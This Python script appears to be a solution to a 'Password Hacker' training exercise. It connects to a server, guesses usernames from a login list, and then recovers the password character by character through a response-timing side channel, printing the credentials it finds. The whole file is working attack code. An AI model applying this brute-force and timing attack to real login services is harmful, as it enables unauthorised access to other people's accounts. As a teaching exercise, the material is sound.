import socket
import sys
import json
import string
from datetime import datetime

logins = 'D:\\User\Documents\PycharmProjects\Password Hacker\Password Hacker\\task\hacking\logins.txt'
letters_and_nums = string.ascii_letters + string.digits
args = sys.argv


def send_json(connection, login, password):
    json_obj = json.dumps({'login': login, 'password': password})
    connection.send(json_obj.encode())
    return json.loads(connection.recv(1024).decode())


if len(args) == 3:
    with socket.socket() as sock:
        sock.connect((str(args[1]), int(args[2])))

        with open(logins, 'r') as login_list:
            for word in login_list:
                word = word.strip('\n')
                response = send_json(sock, word, ' ')
                if response['result'] == 'Wrong password!':
                    # found login
                    break

        passw = ''
        while response['result'] != 'Connection success!':
            for char in letters_and_nums:
                time_start = datetime.now()
                response = send_json(sock, word, passw + char)
                time_diff = datetime.now() - time_start
                if response['result'] == 'Connection success!':
                    # connected
                    print(json.dumps({'login': word, 'password': passw + char}))
                    break
                elif time_diff.microseconds > 1500:
                    # found letter of a pass
                    passw += char
                    break
